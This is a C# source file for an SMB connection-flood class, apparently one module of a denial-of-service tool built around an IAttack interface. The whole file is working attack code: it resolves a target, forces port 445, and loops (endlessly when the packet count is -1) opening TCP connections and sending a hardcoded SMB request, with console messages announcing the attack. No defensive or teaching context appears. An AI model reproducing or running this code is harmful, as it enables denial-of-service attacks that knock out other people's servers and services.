using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class SmbFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string host = target;
            int port = 445; 

            if (host.StartsWith("http://"))
            {
                host = host.Substring(7);
            }
            else if (host.StartsWith("https://"))
            {
                host = host.Substring(8); 
            }

            if (host.Contains(":"))
            {
                var parts = host.Split(':');
                host = parts[0]; 
                port = 445;
            }

            IPAddress ipAddr;
            if (!IPAddress.TryParse(host, out ipAddr))
            {
                try
                {
                    ipAddr = Dns.GetHostEntry(host).AddressList[0];
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error occurred while resolving host: {ex.Message}");
                    return; 
                }
            }
            Console.WriteLine($"[SMB] Attacking {host} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Port: 445");

            int sentPackets = 0;
            IPEndPoint smbServer = new IPEndPoint(ipAddr, port);

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.Connect(smbServer);

                        byte[] smbRequest = GenerateSmbRequest();
                        socket.Send(smbRequest);

                        Console.WriteLine($"[SMB] Packet {sentPackets + 1} sent to {host}:445");
                    }

                    sentPackets++;
                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[SMB] Error: {ex.Message}");
                }
            }
            Console.WriteLine("[SMB] Attack finished.");
        }


        private byte[] GenerateSmbRequest()
        {
            return new byte[]
            {
                0x00, 0x00, 0x00, 0x90, 
                0xFF, 0x53, 0x4D, 0x42, 
                0x72, 0x00, 0x00, 0x00,
                0x00, 0x18, 0x53, 0xC8,
                0x00, 0x26, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00, 
                0x00, 0x00, 0x00, 0x00
            };
        }
    }
}
